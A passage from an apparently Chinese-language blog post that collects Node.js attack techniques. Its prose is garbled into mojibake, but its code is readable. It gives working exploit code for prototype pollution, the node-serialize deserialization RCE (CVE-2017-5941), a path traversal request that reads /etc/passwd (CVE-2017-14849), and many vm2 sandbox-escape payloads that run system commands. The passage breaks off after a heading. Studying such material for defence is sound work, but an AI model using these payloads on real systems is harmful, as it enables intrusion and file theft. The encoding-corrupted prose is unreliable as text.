<ul>
<li><p>åŸå‹é“¾æ±¡æŸ“</p>
<p>  åŸå‹é“¾æ±¡æŸ“å°±æ˜¯ä¿®æ”¹äº†ç±»çš„ <code>prototype</code>é‚£ä¹ˆå°†å¯ä»¥å½±å“æ‰€æœ‰å’Œè¿™ä¸ªå¯¹è±¡æ¥è‡ªåŒä¸€ä¸ªç±»ã€çˆ¶ç¥–ç±»çš„å¯¹è±¡</p>
  <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// fooæ˜¯ä¸€ä¸ªç®€å•çš„JavaScriptå¯¹è±¡</span></span><br><span class="line"><span class="keyword">let</span> foo = &#123;<span class="attr">bar</span>: <span class="number">1</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// foo.bar æ­¤æ—¶ä¸º1</span></span><br><span class="line"><span class="built_in">console</span>.log(foo.bar)</span><br><span class="line"></span><br><span class="line"><span class="comment">// ä¿®æ”¹fooçš„åŸå‹ï¼ˆå³Objectï¼‰</span></span><br><span class="line">foo.__proto__.bar = <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ç”±äºæŸ¥æ‰¾é¡ºåºçš„åŸå› ï¼Œfoo.barä»ç„¶æ˜¯1</span></span><br><span class="line"><span class="built_in">console</span>.log(foo.bar)</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ­¤æ—¶å†ç”¨Objectåˆ›å»ºä¸€ä¸ªç©ºçš„zooå¯¹è±¡</span></span><br><span class="line"><span class="keyword">let</span> zoo = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// æŸ¥çœ‹zoo.bar</span></span><br><span class="line"><span class="built_in">console</span>.log(zoo.bar)</span><br></pre></td></tr></table></figure>



</li>
</ul>
<ul>
<li>å“ªäº›æƒ…å†µä¸‹å­˜åœ¨åŸå‹é“¾æ±¡æŸ“<ul>
<li>å¯¹è±¡merge</li>
<li>å¯¹è±¡cloneï¼ˆå…¶å®å†…æ ¸å°±æ˜¯å°†å¾…æ“ä½œçš„å¯¹è±¡mergeåˆ°ä¸€ä¸ªç©ºå¯¹è±¡ä¸­ï¼‰</li>
</ul>
</li>
</ul>
<p>ç®€å•ä¾‹å­</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">merge</span>(<span class="params">target, source</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> source) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> source &amp;&amp; key <span class="keyword">in</span> target) &#123;</span><br><span class="line">            merge(target[key], source[key])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            target[key] = source[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> o1 = &#123;&#125;</span><br><span class="line"><span class="keyword">let</span> o2 = <span class="built_in">JSON</span>.parse(<span class="string">'&#123;"a": 1, "__proto__": &#123;"b": 2&#125;&#125;'</span>)</span><br><span class="line">merge(o1, o2)</span><br><span class="line"><span class="built_in">console</span>.log(o1.a, o1.b)</span><br><span class="line"></span><br><span class="line">o3 = &#123;&#125;</span><br><span class="line"><span class="built_in">console</span>.log(o3.b)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/06/nodejså­¦ä¹ /image-20200605165118904.png" alt="image-20200605165118904"></p>
<p>éœ€è¦æ³¨æ„çš„æ˜¯ä¸€å®šè¦ä½¿ç”¨JSONæ ¼å¼ï¼ŒJSONè§£æçš„æƒ…å†µä¸‹ï¼Œ<code>__proto__</code>ä¼šè¢«è®¤ä¸ºæ˜¯ä¸€ä¸ªçœŸæ­£çš„â€œé”®åâ€ï¼Œè€Œä¸ä»£è¡¨â€œåŸå‹â€ï¼Œæ‰€ä»¥åœ¨éå†o2çš„æ—¶å€™ä¼šå­˜åœ¨è¿™ä¸ªé”®ã€‚</p>
<p>æˆ‘ä»¬ç”¨JavaScriptåˆ›å»ºo2çš„è¿‡ç¨‹ï¼Œå¦‚æœä½¿ç”¨ï¼ˆ<code>let o2 = {a: 1, &quot;__proto__&quot;: {b: 2}}</code>ï¼‰ï¼Œ<code>__proto__</code>å·²ç»ä»£è¡¨o2çš„åŸå‹äº†ï¼Œæ­¤æ—¶éå†o2çš„æ‰€æœ‰é”®åï¼Œä½ æ‹¿åˆ°çš„æ˜¯<code>[a, b]</code>ï¼Œ<code>__proto__</code>å¹¶ä¸æ˜¯ä¸€ä¸ªkeyï¼Œè‡ªç„¶ä¹Ÿä¸ä¼šä¿®æ”¹Objectçš„åŸå‹ã€‚</p>
<h2 id="2-å±é™©å‡½æ•°"><a href="#2-å±é™©å‡½æ•°" class="headerlink" title="2.å±é™©å‡½æ•°"></a>2.å±é™©å‡½æ•°</h2><p>eval()</p>
<p>eval() å‡½æ•°å¯è®¡ç®—æŸä¸ªå­—ç¬¦ä¸²ï¼Œå¹¶æ‰§è¡Œå…¶ä¸­çš„çš„ JavaScript ä»£ç ã€‚å’ŒPHPä¸­evalå‡½æ•°ä¸€æ ·ï¼Œå¦‚æœä¼ é€’åˆ°å‡½æ•°ä¸­çš„å‚æ•°å¯æ§å¹¶ä¸”æ²¡æœ‰ç»è¿‡ä¸¥æ ¼çš„è¿‡æ»¤æ—¶ï¼Œå°±ä¼šå¯¼è‡´æ¼æ´çš„å‡ºç°ã€‚</p>
<p>æ¼æ´åˆ©ç”¨</p>
<p>Node.jsä¸­çš„chile_process.execè°ƒç”¨çš„æ˜¯/bash.shï¼Œå®ƒæ˜¯ä¸€ä¸ªbashè§£é‡Šå™¨ï¼Œå¯ä»¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚åœ¨evalå‡½æ•°çš„å‚æ•°ä¸­å¯ä»¥æ„é€ <code>require(&#39;child_process&#39;).exec(&#39;&#39;);</code>æ¥è¿›è¡Œè°ƒç”¨ã€‚</p>
<p>å¦‚æœä¸Šä¸‹æ–‡ä¸­æ²¡æœ‰require(ç±»ä¼¼äºCode-Breaking 2018 Thejs)ï¼Œåˆ™å¯ä»¥ä½¿ç”¨<code>global.process.mainModule.constructor._load(&#39;child_process&#39;).exec(&#39;calc&#39;)</code>æ¥æ‰§è¡Œå‘½ä»¤</p>
<p>ç±»ä¼¼å‘½ä»¤</p>
<p>é—´éš”ä¸¤ç§’æ‰§è¡Œå‡½æ•°ï¼š</p>
<ul>
<li>setInteval(some_function, 2000)</li>
</ul>
<p>ä¸¤ç§’åæ‰§è¡Œå‡½æ•°ï¼š</p>
<ul>
<li>setTimeout(some_function, 2000);</li>
</ul>
<p>some_functionå¤„å°±ç±»ä¼¼äºevalå‡½æ•°çš„å‚æ•°</p>
<p>è¾“å‡ºHelloWorldï¼š</p>
<ul>
<li>Function(â€œconsole.log(â€˜HelloWolrdâ€™)â€)()</li>
</ul>
<p>ç±»ä¼¼äºphpä¸­çš„create_function</p>
<h2 id="3-node-serializeååºåˆ—åŒ–RCEæ¼æ´-CVE-2017-5941"><a href="#3-node-serializeååºåˆ—åŒ–RCEæ¼æ´-CVE-2017-5941" class="headerlink" title="3.node-serializeååºåˆ—åŒ–RCEæ¼æ´(CVE-2017-5941)"></a>3.node-serializeååºåˆ—åŒ–RCEæ¼æ´(CVE-2017-5941)</h2><ul>
<li>äº†è§£ä»€ä¹ˆæ˜¯IIFEï¼š</li>
</ul>
<p><a href="https://developer.mozilla.org/zh-CN/docs/Glossary/ç«‹å³æ‰§è¡Œå‡½æ•°è¡¨è¾¾å¼" target="_blank" rel="noopener">IIFEï¼ˆç«‹å³è°ƒç”¨å‡½æ•°è¡¨è¾¾å¼ï¼‰</a>æ˜¯ä¸€ä¸ªåœ¨å®šä¹‰æ—¶å°±ä¼šç«‹å³æ‰§è¡Œçš„ JavaScript å‡½æ•°ã€‚</p>
<p>IIFEä¸€èˆ¬å†™æˆä¸‹é¢çš„å½¢å¼ï¼š</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123; <span class="comment">/* code */</span> &#125;());</span><br><span class="line"><span class="comment">// æˆ–è€…</span></span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123; <span class="comment">/* code */</span> &#125;)();</span><br></pre></td></tr></table></figure>

<ul>
<li><p><code>node-serialize@0.0.4</code>æ¼æ´ç‚¹</p>
<p>  æ¼æ´ä»£ç ä½äºnode_modules\node-serialize\lib\serialize.jsä¸­ï¼š</p>
<p>  <img src="/2020/06/nodejså­¦ä¹ /image-20200605172038278.png" alt="image-20200605172038278"></p>
</li>
</ul>
<p>è¿™ä¸€è¡Œè¯­å¥ï¼Œå¯ä»¥çœ‹åˆ°ä¼ é€’ç»™evalçš„å‚æ•°æ˜¯ç”¨æ‹¬å·åŒ…è£¹çš„ï¼Œæ‰€ä»¥å¦‚æœæ„é€ ä¸€ä¸ª<code>function(){}()</code>å‡½æ•°ï¼Œåœ¨ååºåˆ—åŒ–æ—¶å°±ä¼šè¢«å½“ä¸­IIFEç«‹å³è°ƒç”¨æ‰§è¡Œ</p>
<ul>
<li>æ„é€ Payload</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">serialize = <span class="built_in">require</span>(<span class="string">'node-serialize'</span>);</span><br><span class="line"><span class="keyword">var</span> test = &#123;</span><br><span class="line"> rce : <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="built_in">require</span>(<span class="string">'child_process'</span>).exec(<span class="string">'ls /'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">error, stdout, stderr</span>)</span>&#123;<span class="built_in">console</span>.log(stdout)&#125;);&#125;,</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"åºåˆ—åŒ–ç”Ÿæˆçš„ Payload: \n"</span> + serialize.serialize(test));</span><br></pre></td></tr></table></figure>

<p>ç”Ÿæˆçš„Payloadä¸ºï¼š</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">"rce"</span>:<span class="string">"_$$ND_FUNC$$_function()&#123;require('child_process').exec('ls /',function(error, stdout, stderr)&#123;console.log(stdout)&#125;);&#125;"</span>&#125;</span><br></pre></td></tr></table></figure>

<p>å› ä¸ºéœ€è¦åœ¨ååºåˆ—åŒ–æ—¶è®©å…¶ç«‹å³è°ƒç”¨æˆ‘ä»¬æ„é€ çš„å‡½æ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦åœ¨ç”Ÿæˆçš„åºåˆ—åŒ–è¯­å¥çš„å‡½æ•°åé¢å†æ·»åŠ ä¸€ä¸ª<code>()</code>ï¼Œç»“æœå¦‚ä¸‹ï¼š</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">"rce"</span>:<span class="string">"_$$ND_FUNC$$_function()&#123;require('child_process').exec('ls /',function(error, stdout, stderr)&#123;console.log(stdout)&#125;);&#125;()"</span>&#125;</span><br></pre></td></tr></table></figure>

<p>ä¼ é€’ç»™unserialize(æ³¨æ„è½¬ä¹‰å•å¼•å·)ï¼š</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> serialize = <span class="built_in">require</span>(<span class="string">'node-serialize'</span>);</span><br><span class="line"><span class="keyword">var</span> payload = <span class="string">'&#123;"rce":"_$$ND_FUNC$$_function()&#123;require(\'child_process\').exec(\'ls /\',function(error, stdout, stderr)&#123;console.log(stdout)&#125;);&#125;()"&#125;'</span>;</span><br><span class="line">serialize.unserialize(payload);</span><br></pre></td></tr></table></figure>

<p><img src="/2020/06/nodejså­¦ä¹ /image-20200605172508592.png" alt="image-20200605172508592"></p>
<h2 id="4-Node-js-ç›®å½•ç©¿è¶Šæ¼æ´å¤ç°-CVE-2017-14849"><a href="#4-Node-js-ç›®å½•ç©¿è¶Šæ¼æ´å¤ç°-CVE-2017-14849" class="headerlink" title="4.Node.js ç›®å½•ç©¿è¶Šæ¼æ´å¤ç°(CVE-2017-14849)"></a>4.Node.js ç›®å½•ç©¿è¶Šæ¼æ´å¤ç°(CVE-2017-14849)</h2><p>æ¼æ´å½±å“çš„ç‰ˆæœ¬ï¼š</p>
<ul>
<li><p>Node.js 8.5.0 + Express 3.19.0-3.21.2</p>
</li>
<li><p>Node.js 8.5.0 + Express 4.11.0-4.15.5</p>
<p>  Expressä¾èµ–Sendç»„ä»¶ï¼ŒSendç»„ä»¶0.11.0-0.15.6ç‰ˆæœ¬pipe()å‡½æ•°ä¸­ï¼Œå¦‚å›¾ï¼š</p>
</li>
</ul>
<p><img src="/2020/06/nodejså­¦ä¹ /image-20200605211132980.png" alt="image-20200605211132980"></p>
<p>Sendæ¨¡å—é€šè¿‡<code>normalize(&#39;.&#39; + sep + path)</code>æ ‡å‡†åŒ–è·¯å¾„pathåï¼Œå¹¶æ²¡æœ‰èµ‹å€¼ç»™pathï¼Œè€Œæ˜¯ä»…ä»…åˆ¤æ–­äº†ä¸‹æ˜¯å¦å­˜åœ¨ç›®å½•è·³è½¬å­—ç¬¦ã€‚å¦‚æœæˆ‘ä»¬èƒ½ç»•è¿‡ç›®å½•è·³è½¬å­—ç¬¦çš„åˆ¤æ–­ï¼Œå°±èƒ½æŠŠç›®å½•è·³è½¬å­—ç¬¦å¸¦å…¥545è¡Œçš„<code>join(root, path)</code>å‡½æ•°ä¸­ï¼Œè·³è½¬åˆ°æˆ‘ä»¬æƒ³è¦è·³è½¬åˆ°çš„ç›®å½•ä¸­ï¼Œè¿™æ˜¯Sendæ¨¡å—çš„ä¸€ä¸ªbugï¼Œç›®å‰å·²ç»ä¿®å¤ã€‚</p>
<p>å†æ¥çœ‹Node.jsï¼ŒNode.js 8.5.0å¯¹path.jsæ–‡ä»¶ä¸­çš„<code>normalizeStringPosix</code>å‡½æ•°è¿›è¡Œäº†ä¿®æ”¹ï¼Œä½¿å…¶èƒ½å¤Ÿå¯¹è·¯å¾„åšåˆ°å¦‚ä¸‹çš„æ ‡å‡†åŒ–ï¼š</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line"><span class="keyword">assert</span>.strict<span class="constructor">Equal(<span class="params">path</span>.<span class="params">posix</span>.<span class="params">normalize</span>('<span class="params">bar</span><span class="operator">/</span><span class="params">foo</span>..<span class="operator">/</span>..')</span>, 'bar');</span><br></pre></td></tr></table></figure>

<p>æ–°çš„ä¿®æ”¹å¸¦æ¥äº†é—®é¢˜ï¼Œé€šè¿‡å•æ­¥è°ƒè¯•æˆ‘ä»¬å‘ç°ï¼Œå¯ä»¥é€šè¿‡<code>foo../../</code>å’Œç›®å½•è·³è½¬å­—ç¬¦ä¸€èµ·æ³¨å…¥åˆ°è·¯å¾„ä¸­ï¼Œ<code>foo../../</code>å¯ä»¥æŠŠå˜é‡<code>isAboveRoot</code>è®¾ç½®ä¸º<code>false</code>ï¼ˆä»£ç 161è¡Œï¼‰ï¼Œå¹¶ä¸”åœ¨ä»£ç 135è¡ŒæŠŠè‡ªå·±åˆ æ‰ï¼›å˜é‡<code>isAboveRoot</code>ä¸º<code>false</code>çš„æƒ…å†µä¸‹ï¼Œå¯ä»¥åœ¨<code>foo../../</code>ä¸¤è¾¹è®¾ç½®åŒæ ·æ•°é‡çš„è·³è½¬å­—ç¬¦ï¼Œè®©ä»–ä»¬åŒæ ·åœ¨ä»£ç 135è¡ŒæŠŠè‡ªå·±åˆ é™¤ï¼Œè¿™æ ·å°±å¯ä»¥æ„é€ å‡ºä¸€ä¸ªå¸¦æœ‰è·³è½¬å­—ç¬¦ï¼Œä½†æ˜¯é€šè¿‡<code>normalizeStringPosix</code>å‡½æ•°æ ‡å‡†åŒ–ååˆä¼šå…¨éƒ¨è‡ªåŠ¨ç§»é™¤çš„payloadï¼Œè¿™ä¸ªpayloadé…åˆä¸Šé¢æåˆ°çš„Sendæ¨¡å—bugå°±èƒ½å¤ŸæˆåŠŸçš„è¿”å›ä¸€ä¸ªæˆ‘ä»¬æƒ³è¦çš„ç‰©ç†è·¯å¾„ï¼Œæœ€ååœ¨Sendæ¨¡å—ä¸­è¯»å–å¹¶è¿”å›æ–‡ä»¶ã€‚</p>
<p>ç”¨Burpsuiteè·å–åœ°å€ï¼š<code>/static/../../../a/../../../../etc/passwd</code> å³å¯ä¸‹è½½å¾—åˆ°<code>/etc/passwd</code>æ–‡ä»¶</p>
<p><img src="/2020/06/nodejså­¦ä¹ /image-20200605220006573.png" alt="image-20200605220006573"></p>
<h2 id="5-VMæ²™ç®±é€ƒé€¸"><a href="#5-VMæ²™ç®±é€ƒé€¸" class="headerlink" title="5.VMæ²™ç®±é€ƒé€¸"></a>5.VMæ²™ç®±é€ƒé€¸</h2><p>vmæ˜¯ç”¨æ¥å®ç°ä¸€ä¸ªæ²™ç®±ç¯å¢ƒï¼Œå¯ä»¥å®‰å…¨çš„æ‰§è¡Œä¸å—ä¿¡ä»»çš„ä»£ç è€Œä¸ä¼šå½±å“åˆ°ä¸»ç¨‹åºï¼Œä½†æ˜¯å®‰å…¨æ€§è®©äººæ‰æ€¥ã€‚é€ƒé€¸åå¯è·å–ä¸»ç¨‹åºç¯å¢ƒä¸­çš„<a href="https://zhuanlan.zhihu.com/p/53135129" target="_blank" rel="noopener">ç¯å¢ƒå˜é‡</a>ï¼Œç„¶åé€šè¿‡å„ç§æ–¹æ³•å¯¼å‡º <code>Function</code>å¯¹è±¡(ä¸Šä¸‹æ–‡ç¯å¢ƒæ˜¯ä¸»ç¨‹åºçš„)ï¼Œæ¥ç€å€ŸåŠ©<code>chile_process.exec()</code>å°±å¯ä»¥æ‰§è¡Œä»»æ„å‘½ä»¤äº†</p>
<p>ä¸€ä¸‹payloadå¤§éƒ½æ¥è‡ªvm2çš„<a href="https://github.com/patriksimek/vm2/issues?q=is%3Aissue+author%3AXmiliaH+is%3Aclosed" target="_blank" rel="noopener">issue</a></p>
<p>vm2&lt;=3.9.2</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">"vm"</span>);</span><br><span class="line"><span class="keyword">const</span> env = vm.runInNewContext(<span class="string">`const process = this.constructor.constructor('return this.process')();</span></span><br><span class="line"><span class="string">process.mainModule.require('child_process').execSync('whoami').toString()`</span>);</span><br><span class="line"><span class="built_in">console</span>.log(env);</span><br></pre></td></tr></table></figure>

<p>vm2&lt;=3.9.1</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123;NodeVM&#125; = <span class="built_in">require</span>(<span class="string">'vm2'</span>);</span><br><span class="line"><span class="keyword">const</span> vm = <span class="keyword">new</span> NodeVM();</span><br><span class="line"><span class="built_in">console</span>.log(vm.run(<span class="string">'('</span>+<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">trueprocess = setTimeout(<span class="function"><span class="params">()</span>=&gt;</span>&#123;&#125;).ref().constructor.constructor(<span class="string">'return process'</span>)();</span><br><span class="line"><span class="built_in">console</span>.log(process.mainModule.require(<span class="string">'child_process'</span>).execSync(<span class="string">'ls'</span>).toString())&#125;+<span class="string">')()'</span></span><br><span class="line">));</span><br></pre></td></tr></table></figure>

<p>3.7.0&lt;=vm2&lt;=3.8.3</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123;VM&#125; = <span class="built_in">require</span>(<span class="string">'vm2'</span>);</span><br><span class="line"><span class="keyword">const</span> untrusted = <span class="string">'('</span> + <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">true<span class="built_in">TypeError</span>.prototype.get_process = <span class="function"><span class="params">f</span>=&gt;</span>f.constructor(<span class="string">"return process"</span>)();</span><br><span class="line">true<span class="keyword">try</span>&#123;</span><br><span class="line">truetrue<span class="built_in">Object</span>.preventExtensions(Buffer.from(<span class="string">""</span>)).a = <span class="number">1</span>;</span><br><span class="line">true&#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">truetrue<span class="keyword">return</span> e.get_process(<span class="function"><span class="params">()</span>=&gt;</span>&#123;&#125;).mainModule.require(<span class="string">"child_process"</span>).execSync(<span class="string">"whoami"</span>).toString();</span><br><span class="line">true&#125;</span><br><span class="line">&#125;+<span class="string">')()'</span>;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">true<span class="built_in">console</span>.log(<span class="keyword">new</span> VM().run(untrusted));</span><br><span class="line">&#125;<span class="keyword">catch</span>(x)&#123;</span><br><span class="line">true<span class="built_in">console</span>.log(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123;VM&#125; = <span class="built_in">require</span>(<span class="string">'vm2'</span>);</span><br><span class="line"><span class="keyword">const</span> untrusted = <span class="string">'('</span> + <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">true<span class="keyword">try</span>&#123;</span><br><span class="line">truetrueBuffer.from(<span class="keyword">new</span> <span class="built_in">Proxy</span>(&#123;&#125;, &#123;</span><br><span class="line">truetruetruegetOwnPropertyDescriptor()&#123;</span><br><span class="line">truetruetruetrue<span class="keyword">throw</span> <span class="function"><span class="params">f</span>=&gt;</span>f.constructor(<span class="string">"return process"</span>)();</span><br><span class="line">truetruetrue&#125;</span><br><span class="line">truetrue&#125;));</span><br><span class="line">true&#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">truetrue<span class="keyword">return</span> e(<span class="function"><span class="params">()</span>=&gt;</span>&#123;&#125;).mainModule.require(<span class="string">"child_process"</span>).execSync(<span class="string">"whoami"</span>).toString();</span><br><span class="line">true&#125;</span><br><span class="line">&#125;+<span class="string">')()'</span>;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">true<span class="built_in">console</span>.log(<span class="keyword">new</span> VM().run(untrusted));</span><br><span class="line">&#125;<span class="keyword">catch</span>(x)&#123;</span><br><span class="line">true<span class="built_in">console</span>.log(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>3.7.0&lt;=vm2&lt;=3.8.2</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123;VM&#125; = <span class="built_in">require</span>(<span class="string">'vm2'</span>);</span><br><span class="line"><span class="keyword">const</span> untrusted = <span class="string">'('</span> + <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">true<span class="built_in">Symbol</span> = &#123;</span><br><span class="line">truetrue<span class="keyword">get</span> toStringTag()&#123;</span><br><span class="line">truetruetrue<span class="keyword">throw</span> <span class="function"><span class="params">f</span>=&gt;</span>f.constructor(<span class="string">"return process"</span>)()</span><br><span class="line">truetrue&#125;</span><br><span class="line">true&#125;;</span><br><span class="line">true<span class="keyword">try</span>&#123;</span><br><span class="line">truetrueBuffer.from(<span class="keyword">new</span> <span class="built_in">Map</span>());</span><br><span class="line">true&#125;<span class="keyword">catch</span>(f)&#123;</span><br><span class="line">truetrue<span class="built_in">Symbol</span> = &#123;&#125;;</span><br><span class="line">truetrue<span class="keyword">return</span> f(<span class="function"><span class="params">()</span>=&gt;</span>&#123;&#125;).mainModule.require(<span class="string">"child_process"</span>).execSync(<span class="string">"whoami"</span>).toString();</span><br><span class="line">true&#125;</span><br><span class="line">&#125;+<span class="string">')()'</span>;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">true<span class="built_in">console</span>.log(<span class="keyword">new</span> VM().run(untrusted));</span><br><span class="line">&#125;<span class="keyword">catch</span>(x)&#123;</span><br><span class="line">true<span class="built_in">console</span>.log(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>3.6.7&lt;=vm2&lt;=3.6.9</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123;VM&#125; = <span class="built_in">require</span>(<span class="string">'vm2'</span>);</span><br><span class="line"><span class="keyword">const</span> untrusted = <span class="string">`</span></span><br><span class="line"><span class="string">var process;</span></span><br><span class="line"><span class="string">try&#123;</span></span><br><span class="line"><span class="string">Object.defineProperty(Buffer.from(""),"",&#123;</span></span><br><span class="line"><span class="string">	value:new Proxy(&#123;&#125;,&#123;</span></span><br><span class="line"><span class="string">		getPrototypeOf(target)&#123;</span></span><br><span class="line"><span class="string">			if(this.t)</span></span><br><span class="line"><span class="string">				throw Buffer.from;</span></span><br><span class="line"><span class="string">			this.t=true;</span></span><br><span class="line"><span class="string">			return Object.getPrototypeOf(target);</span></span><br><span class="line"><span class="string">		&#125;</span></span><br><span class="line"><span class="string">	&#125;)</span></span><br><span class="line"><span class="string">&#125;);</span></span><br><span class="line"><span class="string">&#125;catch(e)&#123;</span></span><br><span class="line"><span class="string">	process = e.constructor("return process")();</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">process.mainModule.require("child_process").execSync("whoami").toString()</span></span><br><span class="line"><span class="string">`</span>;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">true<span class="built_in">console</span>.log(<span class="keyword">new</span> VM().run(untrusted));</span><br><span class="line">&#125;<span class="keyword">catch</span>(x)&#123;</span><br><span class="line">true<span class="built_in">console</span>.log(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>vm2&lt;=3.6.8</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123;VM&#125; = <span class="built_in">require</span>(<span class="string">'vm2'</span>);</span><br><span class="line"><span class="keyword">const</span> untrusted = <span class="string">`</span></span><br><span class="line"><span class="string">var process;</span></span><br><span class="line"><span class="string">try&#123;</span></span><br><span class="line"><span class="string">	Object.defineProperty(Buffer.from(""), "", &#123;value:new Proxy(&#123;&#125;,&#123;</span></span><br><span class="line"><span class="string">		getPrototypeOf(target)&#123;</span></span><br><span class="line"><span class="string">			delete this.getPrototypeOf;</span></span><br><span class="line"><span class="string">			Object.defineProperty(Object.prototype, "get", &#123;</span></span><br><span class="line"><span class="string">				get()&#123;</span></span><br><span class="line"><span class="string">					delete Object.prototype.get;</span></span><br><span class="line"><span class="string">					Function.prototype.__proto__ = null;</span></span><br><span class="line"><span class="string">					throw f=&gt;f.constructor("return process")();</span></span><br><span class="line"><span class="string">				&#125;</span></span><br><span class="line"><span class="string">			&#125;);</span></span><br><span class="line"><span class="string">			return Object.getPrototypeOf(target);</span></span><br><span class="line"><span class="string">		&#125;</span></span><br><span class="line"><span class="string">	&#125;)&#125;);</span></span><br><span class="line"><span class="string">&#125;catch(e)&#123;</span></span><br><span class="line"><span class="string">	process = e(()=&gt;&#123;&#125;);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">process.mainModule.require("child_process").execSync("whoami").toString()</span></span><br><span class="line"><span class="string">`</span>;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">true<span class="built_in">console</span>.log(<span class="keyword">new</span> VM().run(untrusted));</span><br><span class="line">&#125;<span class="keyword">catch</span>(x)&#123;</span><br><span class="line">true<span class="built_in">console</span>.log(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>vm2&lt;=3.6.7</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123;VM&#125; = <span class="built_in">require</span>(<span class="string">'vm2'</span>);</span><br><span class="line"><span class="keyword">const</span> untrusted = <span class="string">`</span></span><br><span class="line"><span class="string">Object.getOwnPropertyDescriptor(</span></span><br><span class="line"><span class="string">		Buffer.from.__lookupGetter__("__proto__").call(Buffer.from),</span></span><br><span class="line"><span class="string">		"constructor").value("return process")().mainModule.require(</span></span><br><span class="line"><span class="string">		"child_process").execSync("whoami").toString()`</span></span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">true<span class="built_in">console</span>.log(<span class="keyword">new</span> VM().run(untrusted));</span><br><span class="line">&#125;<span class="keyword">catch</span>(x)&#123;</span><br><span class="line">true<span class="built_in">console</span>.log(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>vm2=3.6.6</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123;VM&#125; = <span class="built_in">require</span>(<span class="string">'vm2'</span>);</span><br><span class="line"><span class="keyword">const</span> untrusted = <span class="string">`</span></span><br><span class="line"><span class="string">Object.__defineGetter__(Symbol.hasInstance,()=&gt;()=&gt;true);</span></span><br><span class="line"><span class="string">Buffer.from.constructor("return process")().mainModule.require("child_process").execSync("id").toString()</span></span><br><span class="line"><span class="string">`</span>;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">true<span class="built_in">console</span>.log(<span class="keyword">new</span> VM().run(untrusted));</span><br><span class="line">&#125;<span class="keyword">catch</span>(x)&#123;</span><br><span class="line">true<span class="built_in">console</span>.log(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>vm2&lt;=3.6.6</p>
